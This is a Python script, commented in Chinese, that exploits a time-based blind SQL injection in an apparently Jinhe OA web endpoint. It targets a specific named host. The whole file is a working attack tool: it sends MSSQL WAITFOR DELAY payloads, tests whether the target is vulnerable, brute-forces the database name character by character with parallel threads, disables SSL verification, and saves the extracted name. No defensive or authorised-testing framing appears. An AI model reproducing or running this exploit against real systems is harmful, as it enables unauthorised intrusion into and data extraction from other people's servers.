import requests
import threading
import time
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import string

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 目标URL
TARGET_URL = "http://oa.jingpeng.cn:443"
POC_BASE = "/c6/Jhsoft.Web.AddMenu/GroupOuterRegisterAdd.aspx/?ID="

# 字符集
CHARSET = string.ascii_lowercase + string.digits + "_"

def check_char_position(db_length, position, char):
    try:
        payload = f"' AND (SELECT CASE WHEN (ASCII(SUBSTRING(DB_NAME(),{position},1))={ord(char)}) THEN WAITFOR DELAY '0:0:5' ELSE 0 END)--"

        encoded_payload = requests.utils.quote(payload)
        
        target_url = TARGET_URL + POC_BASE + encoded_payload
        
        start_time = time.time()
        
        response = requests.get(
            target_url,
            verify=False,
            timeout=10,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        
        response_time = time.time() - start_time
        
        # 如果响应时间大于5秒，说明字符匹配
        if response_time > 5:
            return char
        else:
            return None
            
    except Exception as e:
        print(f"检查字符时出错: {str(e)}")
        return None

def get_database_length():
    """
    获取数据库名的长度
    """
    print("正在获取数据库名长度...")
    for length in range(1, 51):
        try:
            # 构建Payload 
            payload = f"' AND (SELECT CASE WHEN (LEN(DB_NAME())={length}) THEN WAITFOR DELAY '0:0:5' ELSE 0 END)--"
            encoded_payload = requests.utils.quote(payload)
            
            target_url = TARGET_URL + POC_BASE + encoded_payload
            
            start_time = time.time()
            
            response = requests.get(
                target_url,
                verify=False,
                timeout=10,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )
            
            response_time = time.time() - start_time
            
            if response_time > 5:
                print(f"数据库名长度: {length}")
                return length
                
        except Exception as e:
            print(f"获取长度时出错: {str(e)}")
            continue
    
    print("无法确定数据库名长度，使用默认长度20")
    return 20

def get_database_name():
    """
    获取数据库名称
    """
    print("开始爆破数据库名...")
    
    db_length = get_database_length()
    
    if not db_length:
        return None
    
    db_name = ""
    
    # 逐字符爆破
    for position in range(1, db_length + 1):
        char_found = False
        
        print(f"正在爆破第 {position}/{db_length} 个字符...")
        
        # 使用多线程并发测试所有可能的字符
        with ThreadPoolExecutor(max_workers=len(CHARSET)) as executor:
            future_to_char = {
                executor.submit(check_char_position, db_length, position, char): char 
                for char in CHARSET
            }
            
            for future in as_completed(future_to_char):
                char = future_to_char[future]
                try:
                    result = future.result()
                    if result:
                        db_name += result
                        char_found = True
                        print(f"找到字符: {result}, 当前数据库名: {db_name}")
                        executor.shutdown(wait=False)
                        break
                except Exception as e:
                    continue
        
        if not char_found:
            print(f"第 {position} 个字符不在常规字符集中，尝试扩展字符集...")
            extended_charset = CHARSET + string.ascii_uppercase + "-."
            
            for char in extended_charset:
                result = check_char_position(db_length, position, char)
                if result:
                    db_name += result
                    char_found = True
                    print(f"找到字符: {result}, 当前数据库名: {db_name}")
                    break

            if not char_found:
                print(f"使用ASCII码直接查询第 {position} 个字符...")
                found_ascii = brute_force_ascii(position)
                if found_ascii:
                    db_name += chr(found_ascii)
                    print(f"找到ASCII字符: {chr(found_ascii)} (ASCII: {found_ascii}), 当前数据库名: {db_name}")
                else:
                    print(f"无法确定第 {position} 个字符，数据库名可能不完整")
                    db_name += "?"
    
    return db_name

def brute_force_ascii(position):
    """
    使用ASCII码直接爆破字符
    """
    # ASCII可打印字符范围：32-126
    for ascii_code in range(32, 127):
        try:
            payload = f"' AND (SELECT CASE WHEN (ASCII(SUBSTRING(DB_NAME(),{position},1))={ascii_code}) THEN WAITFOR DELAY '0:0:5' ELSE 0 END)--"
            encoded_payload = requests.utils.quote(payload)
            
            target_url = TARGET_URL + POC_BASE + encoded_payload
            
            start_time = time.time()
            
            response = requests.get(
                target_url,
                verify=False,
                timeout=10,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )
            
            response_time = time.time() - start_time
            
            if response_time > 5:
                return ascii_code
                
        except Exception:
            continue
    
    return None

def test_vulnerability():
    print("测试漏洞是否存在...")
    
    try:
        # 使用基础的延时Payload测试
        payload = "' WAITFOR DELAY '0:0:5'--"
        encoded_payload = requests.utils.quote(payload)
        
        target_url = TARGET_URL + POC_BASE + encoded_payload
        
        start_time = time.time()
        
        response = requests.get(
            target_url,
            verify=False,
            timeout=10,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        
        response_time = time.time() - start_time
        
        if response.status_code == 200 and response_time > 5:
            print("✓ 漏洞存在，可以继续进行数据库名爆破")
            return True
        else:
            print(f"✗ 漏洞可能不存在 (状态码: {response.status_code}, 响应时间: {response_time:.2f}s)")
            return False
            
    except Exception as e:
        print(f"测试漏洞时出错: {str(e)}")
        return False

def main():

    print("=" * 60)
    print("SQL注入漏洞数据库名爆破工具")
    print(f"目标: {TARGET_URL}")
    print("=" * 60)
    
    # 首先测试漏洞是否存在
    if not test_vulnerability():
        print("漏洞不存在，停止执行")
        return
    
    print("\n开始爆破数据库名...")
    start_time = time.time()
    
    # 获取数据库名
    database_name = get_database_name()
    
    end_time = time.time()
    total_time = end_time - start_time
    
    print("\n" + "=" * 60)
    if database_name:
        print(f"✓ 数据库名爆破成功!")
        print(f"数据库名称: {database_name}")
        print(f"总耗时: {total_time:.2f} 秒")
        
        # 将结果写入文件
        with open('database_result.txt', 'w', encoding='utf-8') as f:
            f.write(f"目标URL: {TARGET_URL}\n")
            f.write(f"数据库名称: {database_name}\n")
            f.write(f"爆破时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"总耗时: {total_time:.2f} 秒\n")
        
        print(f"结果已保存到: database_result.txt")
    else:
        print("✗ 数据库名爆破失败")
    
    print("=" * 60)

if __name__ == "__main__":
    main()